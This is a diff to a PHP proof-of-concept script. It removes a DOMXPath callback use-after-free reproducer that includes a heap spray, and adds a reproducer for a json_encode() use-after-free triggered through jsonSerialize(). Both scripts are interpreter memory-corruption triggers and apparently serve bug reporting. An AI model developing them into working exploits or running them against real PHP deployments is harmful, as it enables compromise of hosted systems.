@@ -1,59 +1,22 @@
 <?php
 /**
- * DOMXPath callback nodeset argument: namespace-axis nodes from a document
- * created inside another callback. The parent wrapper is tied to the
- * DOMXPath document instead of the foreign document (xpath_callbacks.c).
- * Dropping the XPath frees the foreign document while the namespace node
- * still points at it.
+ * GH-21024: json_encode() UAF when jsonSerialize() drops the last reference
+ * to the object being encoded. ext/json/json_encoder.c
+ * php_json_encode_serializable_object() captures the recursion guard, then
+ * zend_call_known_function() without GC_ADDREF. Nulling the alias frees the
+ * object; ZEND_GUARD_UNPROTECT_RECURSION writes through the dangling guard.
  */
-function say($s) {
-    echo $s, "\n";
-    fflush(STDOUT);
-}
-
-say("php=" . PHP_VERSION);
-$doc = new DOMDocument();
-$doc->loadXML('<root/>');
-
-$xp = new DOMXPath($doc);
-$xp->registerNamespace('my', 'my.ns');
-$xp->registerPHPFunctionNS('my.ns', 'include', function () {
-    $d = new DOMDocument();
-    $d->loadXML('<r><uaf xmlns:a="urn:a">payload</uaf></r>');
-    return $d->documentElement;
-});
-
-$held = null;
-$xp->registerPHPFunctionNS('my.ns', 'take', function ($nodes) use (&$held) {
-    $held = $nodes;
-    return true;
-});
-
-$xp->query('my:take(my:include()/uaf/namespace::*)');
-$n = is_array($held) ? count($held) : -1;
-say("held=$n");
-unset($xp);
-say("xpath-dropped");
-
-/* Reclaim libxml node memory so the dangling parent is not a stale-but-intact chunk. */
-$spray = [];
-for ($i = 0; $i < 4000; $i++) {
-    $s = new DOMDocument();
-    $s->loadXML('<n' . $i . '>' . str_repeat('Z', 48) . '</n' . $i . '>');
-    $spray[] = $s->documentElement;
-}
-
-foreach ($held as $i => $ns) {
-    say("i=$i nodeName=" . @$ns->nodeName);
-    $p = @$ns->parentNode;
-    if ($p === null) {
-        say("i=$i parent=null");
-        continue;
+class Bar implements JsonSerializable {
+    public function jsonSerialize(): mixed {
+        global $ref;
+        $ref = null;
+        return ['k' => 1];
     }
-    say("i=$i parentName=" . @$p->nodeName);
-    say("i=$i parentText=" . @$p->textContent);
 }
-say("release-held");
-unset($held);
-unset($spray);
-say("Done");
+
+$arr = [new Bar];
+$ref = &$arr[0];
+$out = json_encode($arr);
+echo "encoded=";
+var_dump($out);
+echo "survived\n";
